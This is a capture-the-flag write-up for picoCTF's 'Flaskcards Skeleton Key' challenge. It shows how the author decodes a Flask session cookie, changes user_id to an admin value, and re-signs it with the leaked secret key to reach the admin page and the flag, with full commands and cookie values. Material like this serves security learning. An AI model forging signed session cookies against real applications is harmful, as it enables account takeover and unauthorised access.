# Flaskcards Skeleton Key - Points: 600

1. First, lets go through the website : http://2018shell.picoctf.com:5953/
2. Then, lets register and login.
3. Next, lets read the hints
    "What can you do with a flask Secret_Key?"
    I google the whole sentence and get the [result](https://stackoverflow.com/questions/22463939/demystify-flask-app-secret-key). To be brief, it is used for encrypt sessions.
4. Now, lets check the value in cookies : 
    ```
    session : .eJwlj0FqQzEMRO_idRayZVtyLvORJQ8NgRb-T1ald4-h24F58-Y3HTjX9ZXur_O9bul4RLonoISgU47ViGAQsEeMAbMhNCGqBhavPSRI8lyz0epqNcSkCUgl-0TkHm4thilGZOhS7aW3yBWYVJwz-gTnWShySHNZTJpuya8Tx-vnub63T5RCtWxUcKuhVXkPjE7izdhH2YkNcN2997XO_xMt_X0AqNpABA.EPhT8Q.nS3olkaxqAV8RlfE5PGJw-NxrR0
    ```
    Lets decode it by [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager). Here is the payload : 
    ```
    python3 flask_session_cookie_manager3.py decode -c ".eJwlj0FqQzEMRO_idRayZVtyLvORJQ8NgRb-T1ald4-h24F58-Y3HTjX9ZXur_O9bul4RLonoISgU47ViGAQsEeMAbMhNCGqBhavPSRI8lyz0epqNcSkCUgl-0TkHm4thilGZOhS7aW3yBWYVJwz-gTnWShySHNZTJpuya8Tx-vnub63T5RCtWxUcKuhVXkPjE7izdhH2YkNcN2997XO_xMt_X0AqNpABA.EPhT8Q.nS3olkaxqAV8RlfE5PGJw-NxrR0"
    ```
    Then, I get the result : 
    ```
    {
        "_fresh":true,
        "_id":"ff2d7f601de500faf7f3cdd99faa970bf788af37c46d7d071beb50e68a4d7a757f0871cbfd16dca5d9a8f9d1f8e886265d14ffb02c31f6bf31b20d1d75c7e308",
        "csrf_token":"d220426dcd354d8483f089607c5a3c92848a9f34",
        "user_id":"5"
    }
    ```
    Remember our goal : login as admin, so we have to change the user_id and encrypt by secret_key and change the value of cookie. Here is the new payload : 
    ```
    {
        "_fresh":True,
        "_id":"ff2d7f601de500faf7f3cdd99faa970bf788af37c46d7d071beb50e68a4d7a757f0871cbfd16dca5d9a8f9d1f8e886265d14ffb02c31f6bf31b20d1d75c7e308",
        "csrf_token":"d220426dcd354d8483f089607c5a3c92848a9f34",
        "user_id":"1"
    }
    ```
    p.s. Cuz in python is **T**rue and **F**alse. If you input true to encrypt, it can not work.
    Then, we encode it by the payload : 
    ```
    python3 flask_session_cookie_manager3.py encode -s "06f4eefabf03b8f4e521fbdada13f65c" -t '{
        "_fresh":True,
        "_id":"ff2d7f601de500faf7f3cdd99faa970bf788af37c46d7d071beb50e68a4d7a757f0871cbfd16dca5d9a8f9d1f8e886265d14ffb02c31f6bf31b20d1d75c7e308",
        "csrf_token":"d220426dcd354d8483f089607c5a3c92848a9f34",
        "user_id":"1"
    }'
    ```
    And the result is : 
    ```
    .eJwlj0tqA0EMRO_Say-k_kntywzqlooYQwIz9irk7m7ItqBevfpNB864vtL9db7jlo6Hp3sCsgs6sUcjgkFQlvsYMBtCE6JqKLJqd3ESnjEbRVerLiZNQCq8Jpy7L2s-TDGcoaHac2_OFZiUV2H0icIzk7NLWxKFNN3Suk4cr59nfG8fz5lq3igvrbpWLXtgdJLVrKyRd2IDpe7e-4rz_wSnvw-ozkAA.EPhWAQ.80IJwwwBb9d11pjUUVioZlhpybw
    ```
5. After we change the value of session, we would find out that we are admin. Then we press "Admin" next to "List Cards" and get the flag.
6. Here is the flag : picoCTF{1_id_to_rule_them_all_1879a381}
